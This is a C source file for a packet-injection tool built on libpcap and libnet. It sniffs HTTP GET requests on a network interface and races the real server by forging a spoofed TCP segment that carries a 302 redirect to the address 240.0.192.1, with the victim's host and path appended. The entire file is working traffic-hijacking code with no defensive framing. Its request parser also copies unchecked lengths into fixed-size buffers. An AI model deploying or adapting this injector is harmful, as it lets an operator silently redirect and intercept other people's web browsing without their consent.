#define _GNU_SOURCE
#include <pcap.h>
#include <libnet.h>

#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <string.h>

#define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://240.0.192.1/?%s%s\r\n"

#ifdef DEBUG
void print_packet(const u_char *packet);
#endif

pcap_t *init_pcap_handle(const char*);
libnet_t *init_libnet_handle();
int inject(const u_char*, const char*, const char*);

libnet_t *l;

void
get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packet)
{

#ifdef DEBUG
	fprintf(stderr, "Analysis at %ld:%ld, length: %d\n", header->ts.tv_sec, header->ts.tv_usec, header->len);
#endif

    char http_get[128] = {0};
    char http_host[128] = {0};
    size_t get_pos;
    char *_get, *_host;
	const char* payload = (const char *)packet + ETHER_HDR_LEN + LIBNET_IPV4_H + LIBNET_TCP_H;
	//const char* payload = (const char *)packet + 0x44 + LIBNET_IPV4_H + LIBNET_TCP_H;

    if(!((*payload) == 'G' && *(payload+1) == 'E')) {
#ifdef DEBUG
        fprintf(stderr, "Non HTTP GET\n");
#endif
        return;
    }

    _get = memchr(payload, '\r', 100);
    if (_get == NULL) {
#ifdef DEBUG
        fprintf(stderr, "URI Longer than 100, pass\n");
#endif
        return;
    }

    get_pos = _get - payload;
    memcpy(http_get, payload+4, get_pos-13);

    _host = strcasestr(payload+get_pos, "host")+6;
    memcpy(http_host, _host, (strstr(_host, "\r\n") - _host));

#ifdef DEBUG
    fprintf(stderr, "URI: '%s' \n", http_get);
    fprintf(stderr, "HOST: '%s' \n", http_host);
#endif

    inject(packet, http_get, http_host);
    return;
}


int main(int argc, char* argv[]) {

	char* dev = argv[1];

	l = init_libnet_handle(); 
	pcap_t *handle = init_pcap_handle(dev);
    pcap_loop (handle, -1, get_packet, NULL);

#ifdef DEBUG
	fprintf(stderr, "All done, cleaning up...\n");
#endif

	pcap_close(handle);
	libnet_destroy(l);

	return 0;
}

pcap_t *init_pcap_handle(const char* dev) {
	//char *dev = "eth0";
	char errbuf[PCAP_ERRBUF_SIZE];

//	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "pcap_lookupdev failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}
#ifdef DEBUG
	fprintf(stderr, "Found dev for sniffing: %s\n", dev);
#endif

	pcap_t *handle = pcap_open_live(dev, 1536, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	struct bpf_program fp;
	char filter[1024];

    /*
	sprintf(filter,
		"(src host %s) and (tcp src port %s) and (dst host %s) and (tcp dst port %s)\
			and (tcp[tcpflags] & tcp-ack != 0)", 
			server_ip, server_port, client_ip, client_port);

    */

    sprintf(filter, "tcp && dst port 80 && tcp[tcpflags] & tcp-push != 0");

#ifdef DEBUG
	fprintf(stderr, "Prepared filter: %s\n", filter);
#endif

	if (pcap_compile(handle, &fp, filter, 1, 0) == -1) {
		fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "pcap_setfilter failed: %s\n", pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	pcap_freecode(&fp);

	return handle;
}

libnet_t *init_libnet_handle() {
	char errbuf[LIBNET_ERRBUF_SIZE];

	libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
	if (l == NULL) {
		fprintf(stderr, "libnet_init failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	return l;
}

#ifdef DEBUG
void print_packet(const u_char *packet) {
	struct ip *ip;        // IP header
	struct tcphdr *tcp;   // TCP header

	ip = (struct ip *) (packet + ETHER_HDR_LEN);
	tcp = (struct tcphdr *) (packet + ETHER_HDR_LEN + LIBNET_IPV4_H);

	fprintf(stderr, "TCP >>> [src]%s:%u\n", inet_ntoa(ip->ip_src), (unsigned int)ntohs(tcp->source));
	fprintf(stderr, "        [dst]%s:%u\n", inet_ntoa(ip->ip_dst), (unsigned int)ntohs(tcp->dest));
	fprintf(stderr, "        seq:%lu,ack:%lu\n", (unsigned long)ntohl(tcp->seq), (unsigned long)ntohl(tcp->ack_seq));
}
#endif

int inject(const u_char* packet, const char* http_get, const char* http_host) {
    /*
#ifdef DEBUG
	fprintf(stderr, "Sniffed Packet:\n");
	print_packet(packet);
#endif
    */

    char payload[512];

    sprintf(payload, HTTP302, http_host, http_get);
    size_t payload_s = strlen(payload) + 1;

	static libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER, tcp_tag = LIBNET_PTAG_INITIALIZER;
	struct tcphdr tcp_hdr = *(struct tcphdr *) (packet + ETHER_HDR_LEN + LIBNET_IPV4_H);
	struct ip ip_packet = *(struct ip *) (packet + ETHER_HDR_LEN);

	// Forge an tcp segment from the client to the server
	tcp_tag = libnet_build_tcp(
		ntohs(tcp_hdr.dest),		// source port
		ntohs(tcp_hdr.source),		// destination port
		ntohl(tcp_hdr.ack_seq),	// sequence number
		ntohl(tcp_hdr.seq),		// ackowledgement number
		TH_ACK|TH_FIN,				// control flags
		tcp_hdr.window,		// window sizee
		0,					// checksum
		0,					// urgent pointer
		LIBNET_TCP_H + payload_s,	// length of TCP packet
		(u_int8_t *)payload,			// crafted payload
		payload_s,			// payload length
		l,					// pointer to libnet context
		tcp_tag);			// protocol tag

	if (tcp_tag == -1) {
#ifdef DEBUG
		fprintf(stderr, "libnet_build_tcp failed: %s\n", libnet_geterror(l));
#endif
		return 0;
	}
#ifdef DEBUG
	fprintf(stderr, "TCP segment created\n");
#endif

	ip_tag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s,// total length
		0,				// type of service
		ip_packet.ip_id,			// identification number
		0,				// fragmentation offset
		34,				// time to live
		IPPROTO_TCP,	// upper layer protocol
		0,				// checksum
		ip_packet.ip_dst.s_addr,		// source IPv4 address
		ip_packet.ip_src.s_addr,		// destination IPv4 address
		NULL,			// no payload
		0,				// payload length
		l,				// pointer to libnet context
		ip_tag);		// protocol

	if (ip_tag == -1) {
#ifdef DEBUG
		fprintf(stderr, "libnet_build_ipv4 failed: %s\n", libnet_geterror(l));
#endif
		return 0;
	}

	libnet_write(l);

	return 0;
}

